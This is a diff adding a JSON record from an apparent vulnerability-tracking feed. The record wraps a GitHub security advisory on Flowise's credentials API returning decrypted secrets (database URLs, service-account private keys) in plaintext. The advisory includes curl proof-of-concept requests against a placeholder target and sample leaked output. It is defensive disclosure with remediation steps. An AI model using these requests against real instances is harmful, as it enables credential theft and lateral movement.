@@ -1,0 +1,56 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [], \"cve_id\": null, \"cvss\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-200\", \"name\": \"Exposure of Sensitive Information to an Unauthorized Actor\"}], \"description\": \"## Summary\\n\\nThe `GET /api/v1/credentials/:id` endpoint decrypts stored credential data and returns it in the `plainDataObj` field of the API response. While a `redactCredentialWithPasswordType()` function masks fields defined with `type: 'password'` in their component schema, many credential types store highly sensitive data (database connection URLs with embedded passwords, Google service account JSON with RSA private keys, AWS access keys) in fields defined as `type: 'string'`. These string-type fields are returned in **full plaintext** without any redaction.\\n\\nAny authenticated user with `credentials:view` permission can retrieve the raw secrets of any credential in their workspace by calling this endpoint.\\n\\n## Vulnerable Code\\n\\n### Service Layer\\n\\n**`packages/server/src/services/credentials/index.ts`**, `getCredentialById()` (line 127):\\n\\nAt line 138, the credential's encrypted data is decrypted:\\n\\n```typescript\\nconst decryptedCredentialData = await decryptCredentialData(\\n    credential.encryptedData,\\n    credential.credentialName,\\n    appServer.nodesPool.componentCredentials\\n)\\n```\\n\\nAt lines 143-146, the decrypted data is attached to the response as `plainDataObj`:\\n\\n```typescript\\nconst returnCredential: ICredentialReturnResponse = {\\n    ...credential,\\n    plainDataObj: decryptedCredentialData    // <-- decrypted secrets in response\\n}\\n```\\n\\nAt line 147, only `encryptedData` is stripped, leaving `plainDataObj` intact:\\n\\n```typescript\\nconst dbResponse: any = omit(returnCredential, ['encryptedData'])\\n```\\n\\n### Incomplete Redaction\\n\\n**`packages/server/src/utils/index.ts`**, `redactCredentialWithPasswordType()` (line 1697):\\n\\n```typescript\\nexport const redactCredentialWithPasswordType = (\\n    componentCredentialName: string,\\n    decryptedCredentialObj: ICredentialDataDecrypted,\\n    componentCredentials: IComponentCredentials\\n): ICredentialDataDecrypted => {\\n    const plainDataObj = cloneDeep(decryptedCredentialObj)\\n    for (const cred in plainDataObj) {\\n        const inputParam = componentCredentials[componentCredentialName].inputs?.find(\\n            (inp) => inp.type === 'password' && inp.name === cred  // <-- only 'password' type\\n        )\\n        if (inputParam) {\\n            plainDataObj[cred] = REDACTED_CREDENTIAL_VALUE\\n        }\\n    }\\n    return plainDataObj\\n}\\n```\\n\\nThis function **only** redacts fields where `inp.type === 'password'`. Fields with `type: 'string'` are returned verbatim, even when they contain secrets.\\n\\n### Credential Definitions Storing Secrets in String-Type Fields\\n\\n| Credential | Field | Type | Contains |\\n|---|---|---|---|\\n| `mongoDBUrlApi` | `mongoDBConnectUrl` | `string` | `mongodb+srv://user:password@host/db` |\\n| `googleVertexAuth` | `googleApplicationCredential` | `string` | Full service account JSON with RSA private key |\\n| `postgresUrl` | `postgresUrl` | `string` | `postgresql://user:password@host/db` |\\n| `redisCacheUrlApi` | `redisUrl` | `string` | `redis://user:password@host:port` |\\n| `awsApi` | `awsKey` | `string` | AWS Access Key ID |\\n| `langfuseApi` | `langFusePublicKey` | `string` | Langfuse API public key |\\n| `httpBasicAuth` | `basicAuthUsername` | `string` | HTTP Basic Auth username |\\n\\nThere are 60+ credential definitions in `packages/components/credentials/`, many with sensitive string-type fields.\\n\\n## Proof of Concept\\n\\n### Environment\\n\\n- Flowise v3.0.13 (`flowiseai/flowise:latest` Docker image)\\n- Authenticated as admin user via enterprise auth\\n\\n### Steps to Reproduce\\n\\n1. Start Flowise and log in as any user with `credentials:view` permission.\\n2. Create a MongoDB credential with a connection URL containing embedded credentials:\\n\\n```bash\\ncurl -X POST \\\"http://TARGET:3000/api/v1/credentials\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -H \\\"x-request-from: internal\\\" \\\\\\n  -H \\\"Cookie: token=<jwt-token>\\\" \\\\\\n  -d '{\\n    \\\"name\\\": \\\"MongoDB Production\\\",\\n    \\\"credentialName\\\": \\\"mongoDBUrlApi\\\",\\n    \\\"plainDataObj\\\": {\\n      \\\"mongoDBConnectUrl\\\": \\\"mongodb+srv://admin:SuperSecretPassword123@cluster0.abc123.mongodb.net/mydb\\\"\\n    }\\n  }'\\n```\\n\\n3. Retrieve the credential by ID:\\n\\n```bash\\ncurl -X GET \\\"http://TARGET:3000/api/v1/credentials/<credential-id>\\\" \\\\\\n  -H \\\"x-request-from: internal\\\" \\\\\\n  -H \\\"Cookie: token=<jwt-token>\\\"\\n```\\n\\n### Observed Result\\n\\nThe API returns the MongoDB connection URL in **full plaintext**, including the embedded password:\\n\\n```json\\n{\\n  \\\"id\\\": \\\"e9543cad-8c0c-422e-9990-090c3b1dc3ab\\\",\\n  \\\"name\\\": \\\"MongoDB Production\\\",\\n  \\\"credentialName\\\": \\\"mongoDBUrlApi\\\",\\n  \\\"createdDate\\\": \\\"2026-02-07T17:35:29.000Z\\\",\\n  \\\"updatedDate\\\": \\\"2026-02-07T17:35:29.000Z\\\",\\n  \\\"plainDataObj\\\": {\\n    \\\"mongoDBConnectUrl\\\": \\\"mongodb+srv://admin:SuperSecretPassword123@cluster0.abc123.mongodb.net/mydb\\\"\\n  }\\n}\\n```\\n\\nThe same test with a Google Vertex Auth credential returned the **complete service account JSON including the RSA private key** in plaintext:\\n\\n```json\\n{\\n  \\\"id\\\": \\\"f7768444-a4fc-4fa3-8e5e-d0d4df89fb56\\\",\\n  \\\"name\\\": \\\"Google Vertex Auth\\\",\\n  \\\"credentialName\\\": \\\"googleVertexAuth\\\",\\n  \\\"plainDataObj\\\": {\\n    \\\"googleApplicationCredential\\\": \\\"{\\\\\\\"type\\\\\\\":\\\\\\\"service_account\\\\\\\",\\\\\\\"private_key\\\\\\\":\\\\\\\"-----BEGIN RSA PRIVATE KEY-----\\\\\\\\nMIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/ygWep4PAtGoL3VBpFe97XRQFQB\\\\\\\\n-----END RSA PRIVATE KEY-----\\\\\\\\n\\\\\\\",\\\\\\\"client_email\\\\\\\":\\\\\\\"mybot@my-project-123.iam.gserviceaccount.com\\\\\\\"}\\\",\\n    \\\"projectID\\\": \\\"my-project-123\\\"\\n  }\\n}\\n```\\n\\nFor comparison, an OpenAI API key (where the field is typed as `password`) was **correctly redacted**:\\n\\n```json\\n{\\n  \\\"plainDataObj\\\": {\\n    \\\"openAIApiKey\\\": \\\"_FLOWISE_BLANK_07167752-1a71-43b1-\\\"\\n  }\\n}\\n```\\n\\nThis confirms the redaction is only applied to `password`-type fields, leaving `string`-type fields fully exposed.\\n\\n## Impact\\n\\n- **Database credential theft**: MongoDB, PostgreSQL, Redis, MySQL connection URLs with embedded passwords are returned in full plaintext. An attacker can use these to directly access production databases.\\n- **Cloud service account compromise**: Google service account JSON with RSA private keys is returned in plaintext, enabling full impersonation of the service account across Google Cloud.\\n- **AWS key exposure**: AWS Access Key IDs stored in `string`-type fields are exposed, enabling enumeration of active AWS credentials.\\n- **Lateral movement**: Stolen credentials enable pivoting from the Flowise instance to connected cloud services, databases, and APIs.\\n- **Multi-user workspace risk**: In multi-user deployments, any user with `credentials:view` permission can harvest all workspace credentials via the API.\\n\\n## Remediation\\n\\n1. Apply `redactCredentialWithPasswordType()` to **all** sensitive credential fields, not just those typed as `password`. Any field containing secrets (connection strings, JSON credentials, access keys) should be redacted.\\n2. Consider never returning `plainDataObj` in API responses. The UI should use masked previews (e.g., `mongodb+srv://admin:****@cluster0...`) instead of full values.\\n3. Re-type sensitive credential fields from `string` to `password` in component credential definitions to ensure they are covered by the existing redaction logic.\\n4. Add a separate `secret: true` flag to credential field definitions to explicitly mark sensitive fields regardless of their input type.\", \"ghsa_id\": \"GHSA-rwrp-9823-p2xq\", \"github_reviewed_at\": \"2026-08-04T17:57:35Z\", \"html_url\": \"https://github.com/advisories/GHSA-rwrp-9823-p2xq\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-rwrp-9823-p2xq\"}], \"nvd_published_at\": null, \"published_at\": \"2026-08-04T17:57:35Z\", \"references\": [\"https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-rwrp-9823-p2xq\", \"https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3\", \"https://github.com/advisories/GHSA-rwrp-9823-p2xq\"], \"repository_advisory_url\": \"https://api.github.com/repos/FlowiseAI/Flowise/security-advisories/GHSA-rwrp-9823-p2xq\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/FlowiseAI/Flowise\", \"summary\": \"Flowise: Incomplete Credential Redaction Exposes Secrets via API\", \"type\": \"reviewed\", \"updated_at\": \"2026-08-04T17:57:36Z\", \"url\": \"https://api.github.com/advisories/GHSA-rwrp-9823-p2xq\", \"vulnerabilities\": [{\"first_patched_version\": \"3.1.3\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"flowise\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 3.1.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-rwrp-9823-p2xq",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "flowise: <= 3.1.2"
+    ],
+    "authentication_required": true,
+    "cves": [],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "flowise"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-08-04T19:37:52.670850Z",
+  "provenance": {
+    "content_sha256": "8861502c18582d8bf553ad1ea6fc91f6cc9c88179e5a16176aa08be25a8ca7df",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-08-04T17:57:35Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-rwrp-9823-p2xq",
+  "status": "active",
+  "title": "Flowise: Incomplete Credential Redaction Exposes Secrets via API",
+  "updated_at": "2026-08-04T17:57:36Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-rwrp-9823-p2xq"
+}
